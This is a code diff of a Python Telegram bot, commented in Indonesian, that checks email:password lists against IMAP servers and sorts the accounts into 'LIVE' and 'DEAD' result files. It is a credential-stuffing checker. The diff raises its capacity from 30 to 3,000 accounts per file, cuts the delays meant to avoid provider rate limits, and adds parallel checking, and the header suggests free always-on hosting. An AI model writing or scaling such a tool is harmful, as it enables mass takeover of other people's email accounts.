@@ -7,7 +7,7 @@ Cara pakai di Telegram:
   /cek email:password
   /cek email password
   /cek email password imap.gmail.com
-  Kirim file .txt berisi email:password per baris (maks 30/baris file)
+  Kirim file .txt berisi email:password per baris (maks 3.000/baris file)
 
 Hosting gratis yang cocok (polling, tanpa VPS):
   1. Koyeb Free — paling disarankan, tidak tidur, 24/7
@@ -48,9 +48,11 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
 ALLOWED_USER_IDS = {
     int(x) for x in os.environ.get("ALLOWED_USER_IDS", "").replace(",", " ").split() if x.strip().isdigit()
 }
-MAX_FILE_LINES = int(os.environ.get("MAX_FILE_LINES", "30"))
+MAX_FILE_LINES = int(os.environ.get("MAX_FILE_LINES", "3000"))
 CHECK_TIMEOUT = 15  # detik per akun
-DELAY_BETWEEN_CHECKS = 1.0  # detik, biar tidak kena rate-limit provider
+DELAY_BETWEEN_CHECKS = 0.2  # detik, dipakai hanya untuk mode 1 akun; bulk pakai concurrency
+BULK_CONCURRENCY = int(os.environ.get("BULK_CONCURRENCY", "10"))  # cek paralel, biar 3.000 akun tidak makan 1 jam
+MAX_FILE_BYTES = 500_000  # ~500 KB, cukup untuk 3.000 baris email:password
 
 logging.basicConfig(
     format="%(asctime)s | %(levelname)s | %(message)s",
@@ -151,7 +153,7 @@ def check_imap_sync(email: str, password: str, host: str | None = None, port: in
         return {"ok": False, "host": host, "detail": detail, "inbox": 0}
 
 
-_executor = ThreadPoolExecutor(max_workers=3)
+_executor = ThreadPoolExecutor(max_workers=20)
 
 
 async def check_imap(email: str, password: str, host: str | None = None, port: int = 993):
@@ -298,8 +300,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not doc or not (doc.file_name or "").lower().endswith(".txt"):
         await update.message.reply_text("Kirim file `.txt` ya, 1 akun per baris `email:password`.")
         return
-    if doc.file_size and doc.file_size > 100_000:
-        await update.message.reply_text("File terlalu besar, maks ~100 KB.")
+    if doc.file_size and doc.file_size > MAX_FILE_BYTES:
+        await update.message.reply_text("File terlalu besar, maks ~500 KB (cukup untuk 3.000 baris).")
         return
     f = await doc.get_file()
     data = await f.download_as_bytearray()
@@ -316,46 +318,46 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Maks {MAX_FILE_LINES} baris per file, file kamu {len(lines)} baris. Potong dulu ya.")
         return
 
-    status = await update.message.reply_text(f"⏳ Mengecek {len(lines)} akun… (1 detik/akun)")
+    status = await update.message.reply_text(
+        f"⏳ Mengecek {len(lines)} akun… (paralel {BULK_CONCURRENCY}, perkiraan {max(1, len(lines) // 20)} menit untuk 3.000 akun, jangan kirim file lain dulu)"
+    )
     live, dead = [], []
-    for i, line in enumerate(lines, 1):
+    sem = asyncio.Semaphore(BULK_CONCURRENCY)
+    done = 0
+
+    async def one(line: str):
+        nonlocal done
         parsed = parse_cred(line)
         if not parsed:
-            dead.append((line[:60], "Format salah"))
-            continue
+            return (False, line[:60], "Format salah")
         email, password, host = parsed
-        r = await check_imap(email, password, host)
+        async with sem:
+            r = await check_imap(email, password, host)
         if r["ok"]:
-            live.append(f"{email} | inbox {r['inbox']}")
-        else:
-            dead.append((email, r["detail"]))
-        if i < len(lines):
-            await asyncio.sleep(DELAY_BETWEEN_CHECKS)
-        # update progres tiap 5
-        if i % 5 == 0 or i == len(lines):
-            try:
-                await status.edit_text(f"⏳ {i}/{len(lines)} dicek… LIVE {len(live)} • DEAD {len(dead)}")
-            except Exception:
-                pass
+            return (True, f"{email} | inbox {r['inbox']}", "")
+        return (False, email, r["detail"])
 
-    out = [f"📊 *Hasil: {len(lines)} akun* — ✅ LIVE {len(live)} • ❌ DEAD {len(dead)}\n"]
-    if live:
-        out.append("*✅ LIVE:*")
-        out.extend(f"`{x}`" for x in live)
-    if dead:
-        out.append("\n*❌ DEAD:*")
-        for email, why in dead:
-            out.append(f"`{email}` — {why}")
-    result_text = "\n".join(out)
-    # Telegram maks ~4096 karakter per pesan
-    if len(result_text) <= 4000:
-        await status.edit_text(result_text, parse_mode="Markdown")
-    else:
-        await status.edit_text(f"📊 Hasil: {len(lines)} akun — ✅ LIVE {len(live)} • ❌ DEAD {len(dead)}\nFile hasil dikirim di bawah.")
-        live_txt = "\n".join(live) if live else "(tidak ada)"
-        dead_txt = "\n".join(f"{e} | {w}" for e, w in dead) if dead else "(tidak ada)"
-        await update.message.reply_document(document=live_txt.encode(), filename="live.txt", caption="✅ LIVE")
-        await update.message.reply_document(document=dead_txt.encode(), filename="dead.txt", caption="❌ DEAD")
+    # Proses per batch 100 supaya progres bisa dilaporkan & memori aman
+    for start in range(0, len(lines), 100):
+        batch = lines[start:start + 100]
+        results = await asyncio.gather(*[one(ln) for ln in batch])
+        for ok, a, b in results:
+            if ok:
+                live.append(a)
+            else:
+                dead.append((a, b))
+        done += len(batch)
+        try:
+            await status.edit_text(f"⏳ {done}/{len(lines)} dicek… LIVE {len(live)} • DEAD {len(dead)}")
+        except Exception:
+            pass
+
+    await status.edit_text(f"📊 Hasil: {len(lines)} akun — ✅ LIVE {len(live)} • ❌ DEAD {len(dead)}\nFile hasil dikirim di bawah.")
+    live_txt = "\n".join(live) if live else "(tidak ada)"
+    dead_txt = "\n".join(f"{e} | {w}" for e, w in dead) if dead else "(tidak ada)"
+    # Untuk bulk besar, hasil selalu dikirim sebagai file (pesan Telegram maks ~4.096 karakter)
+    await update.message.reply_document(document=live_txt.encode(), filename="live.txt", caption=f"✅ LIVE {len(live)}")
+    await update.message.reply_document(document=dead_txt.encode(), filename="dead.txt", caption=f"❌ DEAD {len(dead)}")
 
 
 async def handle_text_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
